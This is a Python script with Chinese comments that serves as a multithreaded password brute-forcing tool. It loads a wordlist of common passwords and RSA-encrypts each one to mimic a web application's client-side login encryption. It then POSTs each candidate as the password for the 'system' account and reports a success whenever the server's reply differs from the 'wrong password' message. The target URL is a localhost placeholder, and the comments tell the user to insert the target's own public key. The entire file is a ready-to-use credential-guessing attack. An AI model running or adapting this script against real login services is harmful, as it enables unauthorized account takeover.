import queue
import threading
import time
import requests
from threading import Timer
import base64
from Crypto.Cipher import PKCS1_v1_5 as Cipher_pksc1_v1_5
from Crypto.PublicKey import RSA
import json
import requests
import urllib.parse

# 关闭警告输出
import warnings
warnings.filterwarnings("ignore")


# 线程数量
threadNum = 1
# 数据处理总大小
totleNum = 1000

exitFlag = 0 # 线程退出标志,0 正常运行,1 退出线程
queue_data = None # 队列获取数据
count = 0 # 统计进度
bar = 0   # 画进度条的方格数
percentage = 0  # 进度条百分比
bar_width = 60    # 进度条宽度
queueLock = threading.Lock()
workQueue = queue.Queue()
threads = []
threadID = 1

# key是公钥，需要修改成自己的之后再进行加密
key = ""
public_key = '-----BEGIN PUBLIC KEY-----\n' + key + '\n-----END PUBLIC KEY-----'

headers = {
    'Accept': 'application/json, text/plain, */*',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36',
    'Content-Language': 'zh_CN',
    'Content-Type': 'application/json',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9'
}

class myThread (threading.Thread):
    def __init__(self, threadID, q):
        threading.Thread.__init__(self)
        self.threadID = threadID
        # self.name = name
        self.q = q
    def run(self):
        print ("开启线程：" + self.name)
        process_data(self.q)
        print ("退出线程：" + self.name)


# rsa加密方法
def encrpt(password, public_key):
    rsakey = RSA.importKey(public_key)
    cipher = Cipher_pksc1_v1_5.new(rsakey)
    cipher_text = base64.b64encode(cipher.encrypt(password.encode()))
    return cipher_text.decode()

# 线程处理函数
def process_data(q):
    global count,queue_data,exitFlag
    while not exitFlag:
        queueLock.acquire()
        if not workQueue.empty():
            queue_data = q.get()
            queueLock.release()
            try:
                # url = "http://127.0.0.1:" + str(queue_data)
                # r = requests.get(url,timeout=0.5)
                # print(url,r.status_code)
                # data = {"username":"admin","password":queue_data}
                # str_data = json.dumps(data)
                nowdata = queue_data
                text = encrpt(nowdata, public_key)
                data = {"username":"system","password":text}
                # print(text)
                # 对text 进行url 编码
                # postdata = 'type=1&text='+urllib.parse.quote(text)+'&sys=patrol&sysVersion=&operSys=Windows&client=Chrome%3A%20105.0.5195.127&code=&codeKey='
                uri="http://127.0.0.1"

                resp = requests.post(url=uri,json=data,headers=headers)
                resp.encoding = resp.apparent_encoding
                # print(resp.text)
                if "密码有误" != resp.json()["msg"]:
                    print("密码爆破完成:",nowdata,resp.text,'\033[K')
                    # break
                    # 爆破完成退出线程
                    # exitFlag = 1
                    # workQueue.queue.clear()
            except Exception as e:
                # pass
                print(nowdata,e,'\033[K')
                # print(e)
                # exitFlag = 1
                # workQueue.queue.clear()

            finally:
                count += 1

        else:
            queueLock.release()

# 进度条显示
def update_progress():
        # global count, bar, percentage
        bar = int(bar_width*count/totleNum)
        percentage = int((count/totleNum)*100)
        print(f'正在爆破密码: {queue_data}   ({count}/{totleNum})[{"█"*bar}{" "*(bar_width-bar)}] {percentage}％','\033[K', end='\r', flush=True)

def main():
    global threadNum,exitFlag,threadID,totleNum

    with open("TopDevPwd.txt","r") as f:
        passlist = f.readlines()

    # passlist = ["123456","admin"]



    totleNum = len(passlist)
    # 创建新线程
    for tName  in range(threadNum):
        thread = myThread(threadID, workQueue)
        thread.start()
        threads.append(thread)
        threadID += 1

    # 填充队列
    queueLock.acquire()
    for word in passlist:
        workQueue.put(word.strip())
    queueLock.release()

    # 等待队列清空
    try:
        while not workQueue.empty():
            # pass
            timer = Timer(0.5, update_progress)  #定时器
            timer.start()
    except KeyboardInterrupt:
        exitFlag = 1

    # 通知线程是时候退出
    exitFlag = 1

    # 等待所有线程完成
    for t in threads:
        t.join()
    print ("退出主线程")

if __name__ == "__main__":
    main()